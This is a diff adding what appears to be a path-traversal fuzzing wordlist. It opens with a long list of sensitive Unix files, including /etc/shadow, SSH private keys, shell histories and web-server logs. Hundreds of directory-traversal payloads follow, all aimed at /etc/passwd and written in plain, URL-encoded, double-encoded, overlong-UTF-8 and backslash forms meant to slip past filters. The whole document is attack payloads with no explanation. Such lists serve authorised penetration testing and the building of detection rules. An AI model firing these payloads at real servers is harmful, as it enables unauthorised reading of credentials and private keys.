@@ -1,0 +1,1329 @@
+/etc/passwd
+/etc/shadow
+/etc/aliases
+/etc/anacrontab
+/etc/apache2/apache2.conf
+/etc/apache2/httpd.conf
+/etc/at.allow
+/etc/at.deny
+/etc/bashrc
+/etc/bootptab
+/etc/chrootUsers
+/etc/chttp.conf
+/etc/cron.allow
+/etc/cron.deny
+/etc/crontab
+/etc/cups/cupsd.conf
+/etc/exports
+/etc/fstab
+/etc/ftpaccess
+/etc/ftpchroot
+/etc/ftphosts
+/etc/groups
+/etc/grub.conf
+/etc/hosts
+/etc/hosts.allow
+/etc/hosts.deny
+/etc/httpd/access.conf
+/etc/httpd/conf/httpd.conf
+/etc/httpd/httpd.conf
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/etc/httpd/php.ini
+/etc/httpd/srm.conf
+/etc/inetd.conf
+/etc/inittab
+/etc/issue
+/etc/lighttpd.conf
+/etc/lilo.conf
+/etc/logrotate.d/ftp
+/etc/logrotate.d/proftpd
+/etc/logrotate.d/vsftpd.log
+/etc/lsb-release
+/etc/motd
+/etc/modules.conf
+/etc/motd
+/etc/mtab
+/etc/my.cnf
+/etc/my.conf
+/etc/mysql/my.cnf
+/etc/network/interfaces
+/etc/networks
+/etc/npasswd
+/etc/passwd
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache2/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/cgi/php.ini
+/etc/php4/apache2/php.ini
+/etc/php5/apache2/php.ini
+/etc/php5/apache/php.ini
+/etc/php/apache2/php.ini
+/etc/php/apache/php.ini
+/etc/php/cgi/php.ini
+/etc/php.ini
+/etc/php/php4/php.ini
+/etc/php/php.ini
+/etc/printcap
+/etc/profile
+/etc/proftp.conf
+/etc/proftpd/proftpd.conf
+/etc/pure-ftpd.conf
+/etc/pureftpd.passwd
+/etc/pureftpd.pdb
+/etc/pure-ftpd/pure-ftpd.conf
+/etc/pure-ftpd/pure-ftpd.pdb
+/etc/pure-ftpd/putreftpd.pdb
+/etc/redhat-release
+/etc/resolv.conf
+/etc/samba/smb.conf
+/etc/snmpd.conf
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+/etc/ssh/ssh_host_dsa_key
+/etc/ssh/ssh_host_dsa_key.pub
+/etc/ssh/ssh_host_key
+/etc/ssh/ssh_host_key.pub
+/etc/sysconfig/network
+/etc/syslog.conf
+/etc/termcap
+/etc/vhcs2/proftpd/proftpd.conf
+/etc/vsftpd.chroot_list
+/etc/vsftpd.conf
+/etc/vsftpd/vsftpd.conf
+/etc/wu-ftpd/ftpaccess
+/etc/wu-ftpd/ftphosts
+/etc/wu-ftpd/ftpusers
+/logs/pure-ftpd.log
+/logs/security_debug_log
+/logs/security_log
+/opt/lampp/etc/httpd.conf
+/opt/xampp/etc/php.ini
+/proc/cpuinfo
+/proc/filesystems
+/proc/interrupts
+/proc/ioports
+/proc/meminfo
+/proc/modules
+/proc/mounts
+/proc/stat
+/proc/swaps
+/proc/version
+/proc/self/net/arp
+/root/anaconda-ks.cfg
+/usr/etc/pure-ftpd.conf
+/usr/lib/php.ini
+/usr/lib/php/php.ini
+/usr/local/apache/conf/modsec.conf
+/usr/local/apache/conf/php.ini
+/usr/local/apache/log
+/usr/local/apache/logs
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/access.log
+/usr/local/apache/audit_log
+/usr/local/apache/error_log
+/usr/local/apache/error.log
+/usr/local/cpanel/logs
+/usr/local/cpanel/logs/access_log
+/usr/local/cpanel/logs/error_log
+/usr/local/cpanel/logs/license_log
+/usr/local/cpanel/logs/login_log
+/usr/local/cpanel/logs/stats_log
+/usr/local/etc/httpd/logs/access_log
+/usr/local/etc/httpd/logs/error_log
+/usr/local/etc/php.ini
+/usr/local/etc/pure-ftpd.conf
+/usr/local/etc/pureftpd.pdb
+/usr/local/lib/php.ini
+/usr/local/php4/httpd.conf
+/usr/local/php4/httpd.conf.php
+/usr/local/php4/lib/php.ini
+/usr/local/php5/httpd.conf
+/usr/local/php5/httpd.conf.php
+/usr/local/php5/lib/php.ini
+/usr/local/php/httpd.conf
+/usr/local/php/httpd.conf.ini
+/usr/local/php/lib/php.ini
+/usr/local/pureftpd/etc/pure-ftpd.conf
+/usr/local/pureftpd/etc/pureftpd.pdn
+/usr/local/pureftpd/sbin/pure-config.pl
+/usr/local/www/logs/httpd_log
+/usr/local/Zend/etc/php.ini
+/usr/sbin/pure-config.pl
+/var/adm/log/xferlog
+/var/apache2/config.inc
+/var/apache/logs/access_log
+/var/apache/logs/error_log
+/var/cpanel/cpanel.config
+/var/lib/mysql/my.cnf
+/var/lib/mysql/mysql/user.MYD
+/var/local/www/conf/php.ini
+/var/log/apache2/access_log
+/var/log/apache2/access.log
+/var/log/apache2/error_log
+/var/log/apache2/error.log
+/var/log/apache/access_log
+/var/log/apache/access.log
+/var/log/apache/error_log
+/var/log/apache/error.log
+/var/log/apache-ssl/access.log
+/var/log/apache-ssl/error.log
+/var/log/auth.log
+/var/log/boot
+/var/htmp
+/var/log/chttp.log
+/var/log/cups/error.log
+/var/log/daemon.log
+/var/log/debug
+/var/log/dmesg
+/var/log/dpkg.log
+/var/log/exim_mainlog
+/var/log/exim/mainlog
+/var/log/exim_paniclog
+/var/log/exim.paniclog
+/var/log/exim_rejectlog
+/var/log/exim/rejectlog
+/var/log/faillog
+/var/log/ftplog
+/var/log/ftp-proxy
+/var/log/ftp-proxy/ftp-proxy.log
+/var/log/httpd/access_log
+/var/log/httpd/access.log
+/var/log/httpd/error_log
+/var/log/httpd/error.log
+/var/log/httpsd/ssl.access_log
+/var/log/httpsd/ssl_log
+/var/log/kern.log
+/var/log/lastlog
+/var/log/lighttpd/access.log
+/var/log/lighttpd/error.log
+/var/log/lighttpd/lighttpd.access.log
+/var/log/lighttpd/lighttpd.error.log
+/var/log/mail.info
+/var/log/mail.log
+/var/log/maillog
+/var/log/mail.warn
+/var/log/message
+/var/log/messages
+/var/log/mysqlderror.log
+/var/log/mysql.log
+/var/log/mysql/mysql-bin.log
+/var/log/mysql/mysql.log
+/var/log/mysql/mysql-slow.log
+/var/log/proftpd
+/var/log/pureftpd.log
+/var/log/pure-ftpd/pure-ftpd.log
+/var/log/secure
+/var/log/vsftpd.log
+/var/log/wtmp
+/var/log/xferlog
+/var/log/yum.log
+/var/mysql.log
+/var/run/utmp
+/var/spool/cron/crontabs/root
+/var/webmin/miniserv.log
+/var/www/log/access_log
+/var/www/log/error_log
+/var/www/logs/access_log
+/var/www/logs/error_log
+/var/www/logs/access.log
+/var/www/logs/error.log
+~/.atfp_history
+~/.bash_history
+~/.bash_logout
+~/.bash_profile
+~/.bashrc
+~/.gtkrc
+~/.login
+~/.logout
+~/.mysql_history
+~/.nano_history
+~/.php_history
+~/.profile
+~/.ssh/authorized_keys
+~/.ssh/id_dsa
+~/.ssh/id_dsa.pub
+~/.ssh/id_rsa
+~/.ssh/id_rsa.pub
+~/.ssh/identity
+~/.ssh/identity.pub
+~/.viminfo
+~/.wm_style
+~/.Xdefaults
+~/.xinitrc
+~/.Xresources
+~/.xsession
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+..././
+...\.\
+/proc/<int>/fd/<int>
+e.g.
+/proc/2116/fd/11
+..//etc/passwd
+../..//etc/passwd
+../../..//etc/passwd
+../../../..//etc/passwd
+../../../../..//etc/passwd
+../../../../../..//etc/passwd
+../../../../../../..//etc/passwd
+../../../../../../../..//etc/passwd
+..%2f/etc/passwd
+..%2f..%2f/etc/passwd
+..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+%2e%2e//etc/passwd
+%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+..%252f/etc/passwd
+..%252f..%252f/etc/passwd
+..%252f..%252f..%252f/etc/passwd
+..%252f..%252f..%252f..%252f/etc/passwd
+..%252f..%252f..%252f..%252f..%252f/etc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
+%252e%252e//etc/passwd
+%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
+%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
+..\/etc/passwd
+..\..\/etc/passwd
+..\..\..\/etc/passwd
+..\..\..\..\/etc/passwd
+..\..\..\..\..\/etc/passwd
+..\..\..\..\..\..\/etc/passwd
+..\..\..\..\..\..\..\/etc/passwd
+..\..\..\..\..\..\..\..\/etc/passwd
+..%255c/etc/passwd
+..%255c..%255c/etc/passwd
+..%255c..%255c..%255c/etc/passwd
+..%255c..%255c..%255c..%255c/etc/passwd
+..%255c..%255c..%255c..%255c..%255c/etc/passwd
+..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
+..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
+%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd
+..%5c..%5c/etc/passwd
+..%5c..%5c..%5c/etc/passwd
+..%5c..%5c..%5c..%5c/etc/passwd
+..%5c..%5c..%5c..%5c..%5c/etc/passwd
+..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
+%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
+%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
+..%c0%af/etc/passwd
+..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
+%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
+..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
+..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
+%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
+..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
+..%%32%66/etc/passwd
+..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
+..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66/etc/passwd
+%%32%65%%32%65//etc/passwd
